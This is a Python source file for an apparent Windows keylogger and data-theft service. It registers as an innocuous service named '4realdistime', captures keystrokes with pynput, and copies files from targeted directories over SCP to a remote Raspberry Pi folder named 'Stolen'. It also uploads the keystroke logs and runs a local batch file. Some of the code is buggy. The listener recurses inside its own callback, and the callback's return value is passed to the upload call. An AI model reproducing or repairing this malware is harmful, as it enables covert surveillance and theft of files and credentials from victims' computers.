from pickle import FALSE, TRUE
import time
from pathlib import Path
from windowsservice import SMWinservice
from http import client
import paramiko
from scp import SCPClient
from finduser import *
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
import subprocess, os

current_dir = os.getcwd()

now = datetime.today().strftime('%Y-%m-%d')
logg = now + ".txt" 
blyat = Key
cyka = Listener
logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
def on_press(blyat):
    
    logging.info(str(blyat))
    with cyka(on_press=on_press) as cyka :
        cyka.join() #function that acts as a keylogger adding text file to direcotry ran from
    return cyka    

def createsshclient(server, port, user, password):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(server, port, user, password)
    return client

class totallyrealservicce(SMWinservice):
    _svc_name_ = "4realdistime"
    _svc_display_name_ = "4realdistime"
    _svc_description_ = "Thats a cool service"


    def start(self):
        self.isrunning = TRUE

    def stop(self):
        self.isrunning = FALSE

    def main(self):
       server = "raspberrypi.local"
       port = 22
       user = "pi"
       password = "password"
       ssh = createsshclient(server, port, user, password)
       scp = SCPClient(ssh.get_transport())

       for path in interesting_dirs:
    
        full_file_paths = get_filepaths(path) # path is the starting path that the function will walk through
        for filepath in full_file_paths:
                try:
                     scp.put(filepath, remote_path='/home/pi/Stolen')
                     time.sleep(.1)
                     scp.put(on_press(blyat), remote_path='/home/pi/logs')
                     time.sleep(1)
                     subprocess.call([current_dir + "\muke.bat"])
                except OSError:
                 pass
       
if __name__ == '__main__':
    totallyrealservicce.parse_cmd()